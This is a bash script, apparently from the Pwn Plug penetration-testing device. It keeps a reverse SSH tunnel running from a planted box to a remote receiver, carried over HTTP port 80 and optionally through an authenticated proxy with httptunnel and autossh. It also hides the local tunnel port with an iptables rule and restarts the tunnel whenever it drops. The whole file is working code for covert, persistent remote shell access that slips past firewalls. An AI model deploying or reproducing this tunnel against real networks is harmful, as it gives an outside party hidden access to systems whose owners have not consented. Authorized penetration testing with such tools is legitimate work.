#!/bin/bash
# Copyright 2010-2015 Rapid Focus Security, LLC
# pwnieexpress.com
#
# This script contains proprietary software distributed under the terms of the Rapid Focus Security, LLC End User License Agreement (EULA).
#
# Use of this software signifies your agreement to the Rapid Focus Security, LLC End User License Agreement (EULA).
#
# Rapid Focus Security, LLC EULA: http://pwnieexpress.com/pdfs/RFSEULA.pdf
#
# Revision: 4.26.2012

# Get user variables from script_configs
#HTTPtunnel_receiver=
#Proxy_enable=
#Proxy_address=
#Proxy_port=
#Proxy_auth_user=
#Proxy_auth_password=
. /var/pwnplug/script_configs/reverse_ssh_over_HTTP_config.sh

# Set SSH variables
HTTPtunnel_receiver_port=80
SSH_listener_port=3338
SSH_user=pwnplug
SSH_key="/root/.ssh/id_rsa"
Tunnel_status=`ps -C ssh -o pid,args |grep -o "${SSH_listener_port}:localhost:22"`
AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${SSH_listener_port}" |awk '{print$1}'`
SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${SSH_listener_port}:localhost:22" |awk '{print$1}'`
iptables_rule_status=`iptables -nvL |grep -o "tcp dpt:7777" |tail -n1`

# Set standard autossh variables
export AUTOSSH_FIRST_POLL=60
export AUTOSSH_POLL=60
export AUTOSSH_GATETIME=30
export AUTOSSH_LOGFILE=/var/log/autossh.log
export AUTOSSH_DEBUG=no
export AUTOSSH_PATH=/usr/bin/ssh

# Set tunnel-specific autossh variables
export AUTOSSH_PORT=22088
export AUTOSSH_PIDFILE=/var/run/HTTP_autossh.pid

# Add iptables rule if not present
if [ "${iptables_rule_status}" == "tcp dpt:7777" ] ; then echo "iptables rule present" ; \
else iptables -A INPUT -i eth0 -p tcp --dport 7777 -j DROP
fi

# If tunnel already established, do nothing. If not, attempt connect.
if [ "${Tunnel_status}" == "${SSH_listener_port}:localhost:22" ] ; then echo connected ; \
else \
kill ${AUTOSSH_PID}; \
kill ${SSH_ChildProcess_PID}; \
killall htc ; \
sleep 1

if [ "$Proxy_enable" == "YES" ] ; then \
echo "PROXY enabled: " "$Proxy_address" "$Proxy_port" ; \
htc -P "$Proxy_address":"$Proxy_port" -A "$Proxy_auth_user":"$Proxy_auth_password" -F 7777 "$HTTPtunnel_receiver":"$HTTPtunnel_receiver_port" ; \
sleep 1
autossh -2NR ${SSH_listener_port}:localhost:22 -i "$SSH_key" "$SSH_user"@localhost -p 7777 ; \
else \
echo "PROXY disabled" ; \
htc -F 7777 "$HTTPtunnel_receiver":"$HTTPtunnel_receiver_port" ; \
sleep 1
autossh -2NR ${SSH_listener_port}:localhost:22 -i "$SSH_key" "$SSH_user"@localhost -p 7777 ; \
fi

fi
